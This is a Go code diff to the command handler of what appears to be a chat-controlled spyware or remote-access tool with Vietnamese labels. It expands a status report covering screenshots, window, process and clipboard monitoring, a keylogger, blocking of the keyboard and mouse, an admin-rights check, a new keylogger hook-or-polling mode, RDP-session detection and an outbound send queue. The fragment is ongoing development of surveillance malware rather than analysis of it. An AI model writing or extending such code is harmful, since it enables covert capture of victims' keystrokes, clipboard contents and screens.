@@ -1004,15 +1004,23 @@ func handleCommand(text, chatID string) {
 		if isInputBlocked() {
 			blocked = "ĐANG NGẮT"
 		}
-		elev := "Không (chạy thường)"
+		elev := "Thường"
 		if isElevated() {
-			elev = "Có (Admin)"
+			elev = "Admin"
 		}
-		notify(fmt.Sprintf("📊 <b>TRẠNG THÁI</b>\n⏱ Uptime: %dh %dm %ds\n📸 Chụp: %s | mỗi %ds\n🪟 Cửa sổ: %s\n🚀 Tiến trình: %s\n📋 Clipboard: %s\n⌨️ Keylog: %s\n🔒 Bàn phím/chuột: %s\n🛡 Quyền: %s\n💓 Heartbeat: %ds",
+		klMode := "hook"
+		if !hookOK {
+			klMode = "polling"
+		}
+		remote := ""
+		if isRemoteSession() {
+			remote = " | RDP"
+		}
+		notify(fmt.Sprintf("📊 <b>TRẠNG THÁI</b>\n⏱ Uptime: %dh %dm %ds\n📸 Chụp: %s | mỗi %ds\n🪟 Cửa sổ: %s\n🚀 Tiến trình: %s\n📋 Clipboard: %s\n⌨️ Keylog: %s (%s)\n🔒 Bàn phím/chuột: %s\n🛡 Quyền: %s%s\n📤 Hàng đợi: %d\n💓 Heartbeat: %ds",
 			up/3600, (up%3600)/60, up%60,
 			onoff(c.ScreenshotsEnabled), c.ScreenshotInterval,
 			onoff(c.ActivityMonitor), onoff(c.ProcessMonitor), onoff(c.ClipboardMonitor),
-			onoff(c.Keylogger), blocked, elev, c.HeartbeatInterval))
+			onoff(c.Keylogger), klMode, blocked, elev, remote, sendQ.len(), c.HeartbeatInterval))
 	case "/shot":
 		notify("⏳ Đang chụp...")
 		go doScreenshotSend("📸")
